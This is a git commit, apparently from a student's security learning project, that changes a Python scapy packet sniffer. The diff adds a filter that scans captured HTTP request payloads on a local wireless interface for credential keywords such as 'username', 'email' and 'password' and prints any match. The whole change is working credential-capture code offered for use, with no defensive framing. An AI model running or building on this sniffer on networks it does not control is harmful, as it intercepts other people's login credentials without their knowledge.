d8367fbc73bcfc576686f500ced4ccd2df99b3ff
vatojavier <antonioj.casado@estudiante.uam.es>
2019-03-04 14:20:42 +0100

    added usrname adn password filter

--- packet_sniffer.py
+++ packet_sniffer.py
@@ -8,7 +8,11 @@ def sniff(interface):
 
 #process the packet received by scapy.sniff called by prn
 def process_packet(packet):
-    if packet.haslayer(http.HTTPRequest):
-        print(packet)
+    if (packet.haslayer(http.HTTPRequest) and packet.haslayer(scapy.Raw)):
+        load = packet[scapy.Raw].load
+        keywords = ["username","uname","user","id","email","password","pass","code"]
+        for keyword in keywords:
+            if keyword in load:
+                print(packet[scapy.Raw].load)
 
 sniff("wlp3s0")
